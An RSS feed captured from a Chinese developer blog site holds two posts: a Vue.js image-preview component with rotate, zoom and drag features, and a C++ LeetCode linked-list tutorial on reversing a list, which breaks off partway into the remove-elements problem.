<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>vue项目中编写一个图片预览的公用组件 - 空一座旧城，守一个旧人</title>
<link>http://www.cnblogs.com/yinxingen/p/9856473.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yinxingen/p/9856473.html</guid>
<description>&lt;p&gt;今天产品提出了一个查看影像的功能需求。&lt;br/&gt;在查看单据的列表中，有一列是影像字段，一开始根据单据号调用接口查看是否有图片附件，如果有则弹出一个全屏的弹出层，如果没有给出提示。而且，从列表进入详情之后，附件那边也会有一个查看影像的按钮。&lt;br/&gt;所以，根据需求，多个组件需要用到查看影像的功能，所以考虑做一个公用组件，通过组件传值的方法将查看影像文件的入参传过去。&lt;br/&gt;后来，产品要求图片可以旋转缩放。&lt;/p&gt;
&lt;p&gt;废话不多说，贴上代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;template&amp;gt;
    &amp;lt;div class=&quot;filePreview&quot;&amp;gt;
        &amp;lt;el-dialog 
        class=&quot;imgList&quot; 
        title=&quot;预览图片列表&quot; 
        :visible.sync=&quot;imgListShow&quot;
        @close=&quot;$emit('remove')&quot; 
        fullscreen&amp;gt;
            &amp;lt;div class=&quot;allImg&quot;&amp;gt;
                &amp;lt;div style=&quot;width:200px;height:100%;margin-top:50px;overflow-y: auto;margin: 0 auto;&quot;&amp;gt;
                    &amp;lt;img v-for=&quot;(item,index) in imgList&quot; :key=&quot;item.fileid&quot; :src='item.furl' :class=&quot;{ changeColor:changeColor == index}&quot; @click=&quot;handlerImg(item,index)&quot;&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;div style=&quot;width:70%;float:left&quot;&amp;gt;
            &amp;lt;el-pagination
                style=&quot;margin-bottom:20px;&quot;
                background
                @size-change=&quot;handleSizeChange&quot;
                @current-change=&quot;handleCurrentChange1&quot;
                :current-page.sync=&quot;currentImg&quot;
                :page-size=&quot;1&quot;
                layout=&quot;prev, pager, next, jumper&quot;
                :total=&quot;num&quot;&amp;gt;
            &amp;lt;/el-pagination&amp;gt;
            &amp;lt;div style=&quot;width:50%;text-align:center;margin:20px 0&quot;&amp;gt;
                &amp;lt;button  @click=&quot;rotateL&quot; icon=&quot;el-icon-arrow-left&quot;&amp;gt;
                    &amp;lt;i class=&quot;el-icon-arrow-left&quot;&amp;gt;&amp;lt;/i&amp;gt;左旋转
                &amp;lt;/button&amp;gt;
                &amp;lt;button  @click=&quot;rotateR&quot;&amp;gt;右旋转
                    &amp;lt;i class=&quot;el-icon-arrow-right&quot;&amp;gt;&amp;lt;/i&amp;gt;
                &amp;lt;/button&amp;gt;

                &amp;lt;button  @click=&quot;scale&quot;&amp;gt;
                    &amp;lt;i class=&quot;el-icon-zoom-out&quot;&amp;gt;&amp;lt;/i&amp;gt;缩小
                &amp;lt;/button&amp;gt;
                &amp;lt;button  @click=&quot;scale1&quot;&amp;gt;放大
                    &amp;lt;i class=&quot;el-icon-zoom-in&quot;&amp;gt;&amp;lt;/i&amp;gt;
                &amp;lt;/button&amp;gt;
                
            &amp;lt;/div&amp;gt;
            &amp;lt;div id=&quot;test_3&quot; @mousemove=&quot;move&quot; @mouseup=&quot;stop&quot;&amp;gt;
                &amp;lt;p  @mousedown=&quot;start&quot; &amp;gt;
                    &amp;lt;img :src=&quot;furl&quot; ref=&quot;singleImg&quot; class=&quot;originStyle&quot;&amp;gt;
                &amp;lt;/p&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/el-dialog&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
    import {isgetFilePath}from 'api/public_api.js'

    export default {
        data() {
            return {
                imgList:[],
                imgListShow:false,
                num:0,
                furl:'',
                currentImg:1,
                changeColor:-1,
                currentRotate: 0 ,
                currentScale:1,
                canDrag: false,
                offset_x:0,
                offset_y:0,
                mouse_x:0,
                mouse_y:0,
            }
        },
        props:['filePreviewShow','FDJH'],
        created() {
            this.imgListShow = this.filePreviewShow
            this.preview()
        },
        methods: {
            //点击图片显示
            handlerImg(obj,index){
                this.currentRotate = 0
                this.currentScale = 1
                this.rotateScale()
                this.$refs.singleImg.style.left = 0
                this.$refs.singleImg.style.top = 0
                this.furl = obj.furl
                this.changeColor = index
                this.currentImg = index+1
            },
            //影像
            preview(){
                let data = {
                    // FDJH:'000002'
                    FDJH:this.FDJH
                }
                isgetFilePath(data).then(res=&amp;gt;{
                    // console.log(res)
                    if(res.TYPE == &quot;S&quot;){
                        this.imgList = JSON.parse(res.MESSAGE)
                        this.num = this.imgList.length
                        if(this.imgList.length &amp;gt; 0){
                            this.furl = this.imgList[0].furl
                            this.changeColor = 0
                        }else{
                            this.$message.warning('影像文件为空')
                        } 
                    }else{
                        this.$message.warning(res.MESSAGE)
                    }
                    
                    
                })
            },
            handleSizeChange(val) {
                console.log(`每页 ${val} 条`);
            },
            handleCurrentChange1(val) {
                this.currentRotate = 0
                this.currentScale = 1
                this.rotateScale()
                this.$refs.singleImg.style.left = 0
                this.$refs.singleImg.style.top = 0
                this.furl = this.imgList[val-1].furl
                this.changeColor = val-1
            },
            start(e){
                //鼠标左键点击
                e.preventDefault &amp;amp;&amp;amp; e.preventDefault(); //去掉图片拖动响应
                if(e.button==0){
                    this.canDrag=true;
                    //获取需要拖动节点的坐标
                    this.offset_x = document.getElementsByClassName('originStyle')[0].offsetLeft;//x坐标
                    this.offset_y = document.getElementsByClassName('originStyle')[0].offsetTop;//y坐标
                    //获取当前鼠标的坐标
                    this.mouse_x = e.pageX;
                    this.mouse_y = e.pageY;
                }
            },
            move(e){
                e.preventDefault &amp;amp;&amp;amp; e.preventDefault()
                if(this.canDrag==true){
                    let _x = e.pageX - this.mouse_x;
                    let _y = e.pageY - this.mouse_y;
                    //设置移动后的元素坐标
                    let now_x = (this.offset_x + _x ) + &quot;px&quot;;
                    let now_y = (this.offset_y + _y ) + &quot;px&quot;;
                    
                    document.getElementsByClassName('originStyle')[0].style.top = now_y
                    document.getElementsByClassName('originStyle')[0].style.left = now_x
                }
            },
            stop(e){
                this.canDrag = false;
            },
            
            //旋转放大
            rotateScale(){
                this.$refs.singleImg.style.OTransform = 'rotate('+this.currentRotate+'deg)'+'scale('+this.currentScale+')'
                this.$refs.singleImg.style.webkitTransform = 'rotate('+this.currentRotate+'deg)'+'scale('+this.currentScale+')'
                this.$refs.singleImg.style.MozTransform = 'rotate('+this.currentRotate+'deg)'+'scale('+this.currentScale+')'
                this.$refs.singleImg.style.msTransform = 'rotate('+this.currentRotate+'deg)'+'scale('+this.currentScale+')'
                this.$refs.singleImg.style.transform = 'rotate('+this.currentRotate+'deg)'+'scale('+this.currentScale+')'
            },
            //旋转
            rotateL(){
                this.currentRotate += 15
                this.rotateScale()
            },
            rotateR(){
                this.currentRotate -= 15
                this.rotateScale()
            },
            //缩放
            scale(){
                this.currentScale -= 0.1
                if(this.currentScale &amp;lt;= 0.1){
                    this.currentScale = 0.1
                    this.rotateScale()
                }else{
                    this.rotateScale()
                }
            },
            scale1(){
                this.currentScale += 0.1
                this.rotateScale()
            },
        }
    }
&amp;lt;/script&amp;gt;

&amp;lt;style rel=&quot;stylesheet/scss&quot; lang=&quot;scss&quot; slot-scope=&quot;scope&quot;&amp;gt;
    .filePreview{
        .imgList{
            .el-dialog__headerbtn{
                font-size:26px;
            }
            .el-dialog__body{
                .allImg{
                    width:30%;
                    float:left;
                    height:600px;
                    img{
                        width: 150px;
                        height: 150px;
                        margin: 5px;
                        cursor: pointer;
                    }
                    .changeColor{
                        border:4px solid #409eff;
                    }
                }
            }
        }
        .originStyle{
            position:absolute;
            left:0;top:0;
            cursor: pointer;
            // transform-origin: 50% 50%;
        }
        #test_3{
            position: relative;
            width: 600px;
            height: 400px;
            overflow: hidden;
            // overflow: scroll;
            &amp;amp; &amp;gt; p{
                position: absolute;
                cursor: move;
                transform-origin: center;
                width: 100%;
                height: 100%;
                padding: 0;
                -webkit-margin-before: 0;
                -webkit-margin-after: 0;
                left: 0;
                top: 0;
                &amp;amp; &amp;gt; img{
                    display: inline-block;
                    vertical-align: middle;
                }
            }
        }
    }
    
    
&amp;lt;/style&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;后来出现一个问题，有一类的单据的图片存储在数据库中，之前的图片都是存储在服务器中，只需要传入单据号查询返回给我图片路径即可。&lt;/p&gt;
&lt;p&gt;而存储在数据库当中不一样，需要拼接路径，一下是解决方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;preview(){

        if(this.imgList.length &amp;gt; 0){
            this.imgList.map(item=&amp;gt;{
                item.furl = process.env.APP_EXCEL_PATH+'portal/gys/querydownloadPurchaFile?fileid='+ item.FILEID +'&amp;amp;gysdh='+item.CREATENAME //接口加入参
            })
        }
        this.num = this.imgList.length
        this.furl = this.imgList[0].furl
        this.changeColor = 0
},
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;一般情况下，图片的预览，图片存储在服务器中，数据库中一般只存储路径。&lt;br/&gt;我们后端我也是醉了，尽给我找事情，说起来都是泪。&lt;/p&gt;
</description>
<pubDate>Fri, 26 Oct 2018 07:14:00 +0000</pubDate>
<dc:creator>空一座旧城，守一个旧人</dc:creator>
<og:description>今天产品提出了一个查看影像的功能需求。 在查看单据的列表中，有一列是影像字段，一开始根据单据号调用接口查看是否有图片附件，如果有则弹出一个全屏的弹出层，如果没有给出提示。而且，从列表进入详情之后，附件</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yinxingen/p/9856473.html</dc:identifier>
</item>
<item>
<title>【算法篇】链表专题 - 柳德维</title>
<link>http://www.cnblogs.com/liudw-0215/p/9855221.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liudw-0215/p/9855221.html</guid>
<description>&lt;h2&gt;　　前言：&lt;/h2&gt;
&lt;p&gt;　　从今天开始要攻克算法专题了，今天是链表篇，关于链表相关的考题，不会太多涉及时间复杂度，而主要考察链表和指针操作；为啥大厂喜欢考察数据结构和算法？因为这些是对基本功的升华，不会考察数组指针、函数指针等，考一个链表，就能考察对指针的理解，我相信不理解指针，链表学起来很费劲！&lt;/p&gt;
&lt;h2&gt;　　一、简介&lt;/h2&gt;
&lt;p&gt;　　我会一个模块一个模块进行学习和练习，练习时我会从leetcode上选题，都知道leetcode吧？是OJ中最权威的平台了，在上面可以找算法题和练习，很好的一个网站，每一个题都会说明leetcode的第几题，方便大家查找和练习。&lt;/p&gt;
&lt;h2&gt;　　二、反转链表&lt;/h2&gt;
&lt;p&gt;　　LeetCode上第206题：Reverse Linked List，官网是英文，但鉴于英文对一些人看起来比较费劲，翻译成中文，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;反转单链表。
例子:
输入:&lt;/span&gt;&lt;span&gt;1&lt;/span&gt; - &amp;gt; &lt;span&gt;2&lt;/span&gt; - &amp;gt; &lt;span&gt;3&lt;/span&gt; - &amp;gt; &lt;span&gt;4&lt;/span&gt; - &amp;gt; &lt;span&gt;5&lt;/span&gt; - &amp;gt;&lt;span&gt; NULL
输出:&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; - &amp;gt; &lt;span&gt;4&lt;/span&gt; - &amp;gt; &lt;span&gt;3&lt;/span&gt; - &amp;gt; &lt;span&gt;2&lt;/span&gt; - &amp;gt; &lt;span&gt;1&lt;/span&gt; - &amp;gt;&lt;span&gt; NULL
跟进:
链表可以迭代或递归地反转。你能实现这两个吗&lt;/span&gt;?
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　可能有人会想到直接去改链表节点里的值，这是不允许，一般都是操作next指针，去改变指针指向；画图进行讲解，如下：&lt;/p&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1249620/201810/1249620-20181026132344811-939119127.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　需要三个指针pre/cur/next去反转，将2位置指向pre位置，pre指向1号位置，1号位置指向3号位置，这样就可以进行反转了。代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; ListNode {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; val;
    ListNode &lt;/span&gt;*&lt;span&gt;next;
    ListNode(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x) : val(x), next(NULL) {}
};

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 206. Reverse Linked List
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt; &lt;span&gt;https://leetcode.com/problems/reverse-linked-list/description/&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 时间复杂度: O(n)
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 空间复杂度: O(1)&lt;/span&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Solution {
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt;:
    ListNode&lt;/span&gt;* reverseList(ListNode*&lt;span&gt; head) {

        ListNode&lt;/span&gt;* pre =&lt;span&gt; NULL;
        ListNode&lt;/span&gt;* cur =&lt;span&gt; head;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(cur !=&lt;span&gt; NULL){
            ListNode&lt;/span&gt;* next = cur-&amp;gt;&lt;span&gt;next;
            cur&lt;/span&gt;-&amp;gt;next =&lt;span&gt; pre;
            pre &lt;/span&gt;=&lt;span&gt; cur;
            cur &lt;/span&gt;=&lt;span&gt; next;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; pre;
    }
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　我是按照LeetCode的格式进行编写的，然后去LeetCode上去试一下，鉴于可能有人不知道怎么使用LeetCode，我简单进行演示一下怎么使用：&lt;/p&gt;
&lt;p&gt;　　第一步：百度leetcode，如下：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1249620/201810/1249620-20181026134349481-1473307792.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　　　第二步：点击“Create Account”，创建自己的用户，需要填写邮箱，需要点击链接进行激活，否则刷题无法提交；刚开始写的邮箱没给我发邮件，又在个人资料里重新换了邮箱，就可以收到了；&lt;/p&gt;
&lt;p&gt;　　　　第三步：在首页找题，如果能记住题目，可以输入题目进行搜索；也可以搜索题号，如206，也可以搜索到，如下图：&lt;/p&gt;
&lt;p&gt;　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1249620/201810/1249620-20181026133807075-1898215497.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;第四步：提交代码，我将上面写的代码放到leetcode，点击右下角的“Submit Solution”,就可以看到下面的“Submission Solution：Accepted”，就表示通过了，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1249620/201810/1249620-20181026134203944-2004872771.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;   这样就OK了。&lt;/p&gt;
&lt;h2&gt;　　三、测试程序&lt;/h2&gt;
&lt;p&gt;　　这部分主要说明一下怎么去自己测试程序的运行？主要实现链表的创建、遍历、销毁（C++堆上内存要自己管理）。&lt;/p&gt;
&lt;h3&gt;　　1、创建链表&lt;/h3&gt;
&lt;p&gt;　　将数组传给函数，根据数组实现链表赋值；还会传入n创建多大的链表，代码如下:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据n个元素的数组arr创建一个链表, 并返回链表的头&lt;/span&gt;
ListNode* createLinkedList(&lt;span&gt;int&lt;/span&gt; arr[], &lt;span&gt;int&lt;/span&gt;&lt;span&gt; n){

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(n == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;

    ListNode&lt;/span&gt;* head = &lt;span&gt;new&lt;/span&gt; ListNode(arr[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt; ; i &amp;lt; n ; i ++&lt;span&gt;){
        curNode&lt;/span&gt;-&amp;gt;next = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ListNode(arr[i]);
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; head;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;span&gt;注意：&lt;/span&gt;创建的链表，没有真实的“头结点”，就是只存一个开始指针的节点，所以删除第一个节点要注意！&lt;/p&gt;
&lt;h3&gt;　　2、遍历链表&lt;/h3&gt;
&lt;p&gt;　　通过头结点进行遍历链表，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 打印以head为头结点的链表信息内容&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; printLinkedList(ListNode*&lt;span&gt; head){

    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curNode !=&lt;span&gt; NULL){
        cout &lt;/span&gt;&amp;lt;&amp;lt; curNode-&amp;gt;val &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; -&amp;gt; &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
    }

    cout &lt;/span&gt;&amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; endl;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　3、销毁链表&lt;/h3&gt;
&lt;p&gt;　　将创建时分配的内存释放，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 释放以head为头结点的链表空间&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; deleteLinkedList(ListNode*&lt;span&gt; head){

    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curNode !=&lt;span&gt; NULL){
        ListNode&lt;/span&gt;* delNode =&lt;span&gt; curNode;
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
        &lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt; delNode;
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　4、测试程序&lt;/h3&gt;
&lt;p&gt;　　对反转链表代码进行测试，整体代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('554901b4-508a-4c21-827a-751d79df87d7')&quot; readability=&quot;36.5&quot;&gt;&lt;img id=&quot;code_img_closed_554901b4-508a-4c21-827a-751d79df87d7&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_554901b4-508a-4c21-827a-751d79df87d7&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('554901b4-508a-4c21-827a-751d79df87d7',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_554901b4-508a-4c21-827a-751d79df87d7&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;68&quot;&gt;
&lt;pre&gt;
#include &amp;lt;iostream&amp;gt;

&lt;span&gt;using&lt;/span&gt; &lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; std;

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;*
 * Definition for singly-linked list.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; ListNode {
     &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; val;
     ListNode &lt;/span&gt;*&lt;span&gt;next;
     ListNode(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x) : val(x), next(NULL) {}
};

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt; LinkedList 测试辅助函数&lt;/span&gt;

&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据n个元素的数组arr创建一个链表, 并返回链表的头&lt;/span&gt;
ListNode* createLinkedList(&lt;span&gt;int&lt;/span&gt; arr[], &lt;span&gt;int&lt;/span&gt;&lt;span&gt; n){

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(n == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;

    ListNode&lt;/span&gt;* head = &lt;span&gt;new&lt;/span&gt; ListNode(arr[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt; ; i &amp;lt; n ; i ++&lt;span&gt;){
        curNode&lt;/span&gt;-&amp;gt;next = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ListNode(arr[i]);
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; head;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 打印以head为头结点的链表信息内容&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; printLinkedList(ListNode*&lt;span&gt; head){

    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curNode !=&lt;span&gt; NULL){
        cout &lt;/span&gt;&amp;lt;&amp;lt; curNode-&amp;gt;val &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; -&amp;gt; &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
    }

    cout &lt;/span&gt;&amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; endl;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 释放以head为头结点的链表空间&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; deleteLinkedList(ListNode*&lt;span&gt; head){

    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curNode !=&lt;span&gt; NULL){
        ListNode&lt;/span&gt;* delNode =&lt;span&gt; curNode;
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
        &lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt; delNode;
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}


&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 206. Reverse Linked List
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt; &lt;span&gt;https://leetcode.com/problems/reverse-linked-list/description/&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 时间复杂度: O(n)
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 空间复杂度: O(1)&lt;/span&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Solution {
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt;:
    ListNode&lt;/span&gt;* reverseList(ListNode*&lt;span&gt; head) {

        ListNode&lt;/span&gt;* pre =&lt;span&gt; NULL;
        ListNode&lt;/span&gt;* cur =&lt;span&gt; head;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(cur !=&lt;span&gt; NULL){
            ListNode&lt;/span&gt;* next = cur-&amp;gt;&lt;span&gt;next;
            cur&lt;/span&gt;-&amp;gt;next =&lt;span&gt; pre;
            pre &lt;/span&gt;=&lt;span&gt; cur;
            cur &lt;/span&gt;=&lt;span&gt; next;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; pre;
    }
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; main(){

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; arr[] = {&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;, &lt;span&gt;4&lt;/span&gt;, &lt;span&gt;5&lt;/span&gt;&lt;span&gt;};
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; n = &lt;span&gt;sizeof&lt;/span&gt;(arr)/&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;);

    ListNode&lt;/span&gt;* head =&lt;span&gt; createLinkedList(arr, n);
    printLinkedList(head);

    ListNode&lt;/span&gt;* head2 =&lt;span&gt; Solution().reverseList(head);
    printLinkedList(head2);

    deleteLinkedList(head2);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　运行结果如下：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1249620/201810/1249620-20181026142356051-149047601.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　进行了反转，没有问题；&lt;/p&gt;
&lt;h2&gt;　　四、删除链表元素&lt;/h2&gt;
&lt;h3&gt; 　　1、题目&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　LeetCode上第203题目：&lt;span&gt;Remove Linked List Elements，题目如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;从具有值val的整数链表中删除所有元素。
例子:
输入:&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;-&amp;gt;&lt;span&gt;2&lt;/span&gt;-&amp;gt;&lt;span&gt;6&lt;/span&gt;-&amp;gt;&lt;span&gt;3&lt;/span&gt;-&amp;gt;&lt;span&gt;4&lt;/span&gt;-&amp;gt;&lt;span&gt;5&lt;/span&gt;-&amp;gt;&lt;span&gt;6&lt;/span&gt;,val = &lt;span&gt;6&lt;/span&gt;&lt;span&gt;
输出:&lt;/span&gt;&lt;span&gt;1&lt;/span&gt; - &amp;gt; &lt;span&gt;2&lt;/span&gt; - &amp;gt; &lt;span&gt;3&lt;/span&gt; - &amp;gt; &lt;span&gt;4&lt;/span&gt; - &amp;gt; &lt;span&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
